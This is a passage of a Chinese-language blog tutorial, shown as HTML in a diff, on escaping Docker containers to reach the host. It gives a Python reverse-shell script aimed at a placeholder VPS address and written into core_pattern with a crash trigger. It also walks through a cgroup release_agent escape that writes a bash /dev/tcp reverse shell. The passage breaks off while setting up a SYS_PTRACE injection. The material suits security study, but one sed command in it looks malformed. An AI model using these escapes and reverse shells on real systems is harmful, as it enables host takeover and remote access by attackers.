+&lt;p&gt;找到之后我们就可以去看这个work目录同级还有一个merged目录，是挂载点。可能怎么说比较混乱，我们直接去看这个目录吧。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker26.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到这里直接就是我们docker的根目录了，很明显是个挂载，所以我们就可以在docker里面写文件，然后让宿主机执行。一个反弹shell的exp。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &amp;gt;/tmp/exp.py &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;#!/usr/bin/python
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;import os
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;import pty
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;import socket
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;lhost = &amp;#34;your_vps_ip&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;lport = 8888
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;def main():
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;   s.connect((lhost, lport))
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;   os.dup2(s.fileno(), 0)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;   os.dup2(s.fileno(), 1)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;   os.dup2(s.fileno(), 2)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;   os.putenv(&amp;#34;HISTFILE&amp;#34;, &amp;#39;/dev/null&amp;#39;)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;   pty.spawn(&amp;#34;/bin/bash&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;   os.remove(&amp;#39;/tmp/.x.py&amp;#39;)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;   s.close()
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;if __name__ == &amp;#34;__main__&amp;#34;:
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;   main()
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后我们需要将这个文件的路径写入宿主机的&lt;code&gt;/proc/sys/kernel/core_pattern&lt;/code&gt; 文件中。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;|/var/lib/docker/overlay2/一堆数字字母/merged/tmp/exp.py \rcore &amp;#34;&lt;/span&gt; &amp;gt; /test2/proc/sys/kernel/core_pattern
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后根据上面这个文件的原理，在程序崩溃时会自动执行，我们现在只要让docker崩溃一下，就可以反弹shell了。后续其实就比较简单了，这里给一个比较简单的崩溃程序吧。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &amp;gt;/tmp/exp.c &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;int main(void)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    int *a = NULL;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    *a = 1;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    return 0;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;经典崩溃程序，直接GCC编译运行即可。这里就不打了，昨天晚上刚玩崩这个服务器。&lt;/p&gt;
+&lt;h2 id=&#34;cgroup-配置错误&#34;&gt;Cgroup 配置错误
+&lt;/h2&gt;&lt;p&gt;先简单介绍一下这个是啥：
+Cgroup 是 Linux 提供的一种用于资源管理的功能，通过 Cgroup 可以对进程资源（如 CPU、内存等）的使用情况进行限制和统计。&lt;br&gt;
+那我们怎么通过这个逃逸呢：
+这种攻击利用了&lt;code&gt;notify_on_release&lt;/code&gt; 和 &lt;code&gt;release_agent&lt;/code&gt; 这两个 Cgroup 的机制，用于在 Cgroup 子目录资源被清空时执行特定的动作 实现逃逸。
+利用条件
+● 以root用户身份在容器内运行
+● 使用SYS_ADMINLinux功能运行
+● 缺少AppArmor配置文件，否则将允许mountsyscall
+● cgroup v1虚拟文件系统必须以读写的方式安装在容器内&lt;/p&gt;
+&lt;p&gt;这些就是从网上搜到的了，我们来实验一下吧。先拉一个容器出来。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker run -it --rm --cap-add&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;SYS_ADMIN --security-opt &lt;span class=&#34;nv&#34;&gt;apparmor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;unconfined ubuntu:18.04 /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker27.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我们成功进去之后可以顺手判断一下是不是SYS_ADMIN的权限。
+然后我们来判断符不符合攻击条件。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mount &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep cgroup
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls -l /sys/fs/cgroup
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;需要是cgroup文件系统，并且权限为读写权限。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker28.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后我们来挂载一下这个文件系统。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /tmp/test3
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mount -t cgroup -o memory cgroup /tmp/test3
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里遇到了一个坑点，如果你的系统版本比较高，是cgroupv2的版本的，这个取决于宿主机，这里就不能直接挂载，需要特权容器才能挂载，但是特权容器就不用挂载这个了，我们这里纯练习，所以还是用特权容器吧。命令也要换一下。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mount -t cgroup2 none /tmp/test3
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;挂载的命令。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker29.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK，成功挂载了。我们来创建一个配置目录。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /tmp/test3/conf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后我们启用通知机制，当 &lt;code&gt;conf&lt;/code&gt; 子目录的任务（进程）清空时会触发内核动作。(启动内核那就很明显了，跟前面的打法差不多了)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &amp;gt; /tmp/test3/conf/notify_on_release
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里又执行失败了，还是版本问题，后续只能用文字说明了。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;使用 sed 命令从 /etc/mtab 文件中解析出宿主机的路径前缀
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sed -n &lt;span class=&#34;s1&#34;&gt;&amp;#39;/^cgroup\|^cgroup2/p&amp;#39;&lt;/span&gt; /etc/mtab &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; head -n1 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; awk &lt;span class=&#34;s1&#34;&gt;&amp;#39;{print $2}&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;获得这个之后我们去设置一下。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;host_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;sed -n &lt;span class=&#34;s1&#34;&gt;&amp;#39;s/.*\perdir=[^,]*.*/\1/p&amp;#39;&lt;/span&gt; /etc/mtab
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;/etc/mtab&lt;/code&gt; 记录了当前系统挂载的所有文件系统的信息，可以了解当前哪些设备或网络资源已经被挂载到文件系统中。通过获取宿主机的挂载路径，就可以在容器内部使用这个路径来操作宿主机上的文件&lt;br&gt;
+这个路径会被用于配置 &lt;code&gt;release_agent&lt;/code&gt;
+然后设置 &lt;code&gt;release_agent&lt;/code&gt; 为一个脚本的路径，通知事件触发时由内核执行该脚本，创建反弹 shell 的脚本，并写入其内容就可以了。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$host_path&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/cmd&amp;#34;&lt;/span&gt; &amp;gt; /tmp/test3/release_agent
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;#!/bin/sh&amp;#39;&lt;/span&gt; &amp;gt; /cmd  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/8888 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /cmd
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;将当前 shell 的 PID 写入 /tmp/test3/conf/cgroup.procs 文件 ，意味着当前 shell 进程将被“添加”到这个 cgroup 中，其他的进程被清空只保留当前的shell进程。&lt;br&gt;
+触发 notify_on_release，清空任务后，release_agent 自动执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sh -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;echo \$\$ &amp;gt; /tmp/test3/conf/cgroup.procs&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;$$&lt;/code&gt; 是一个特殊变量，它代表当前 shell 进程的 PID（进程 ID）&lt;/p&gt;
+&lt;h2 id=&#34;sys_ptrace-进程注入&#34;&gt;SYS_PTRACE 进程注入
+&lt;/h2&gt;&lt;p&gt;先说原理和利用条件：
+用户授予了容器SYS_PTRACE权限，并且与宿主机共享一个进程命名空间(&amp;ndash;pid=host)，使得在容器内可以查看到宿主机的进程，并可以利用进程注入，反弹shell，从而实现逃逸
+利用条件&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;容器有SYS_PTRACE权限&lt;/li&gt;
+&lt;li&gt;与宿主机共享一个进程命名空间&lt;/li&gt;
+&lt;li&gt;容器以root权限运行&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;OK，我们来建一个容器看看。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker run -it --rm --pid&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;host --cap-add&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;SYS_PTRACE ubuntu:18.04 /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后我们来看符不符合条件：&lt;/p&gt;
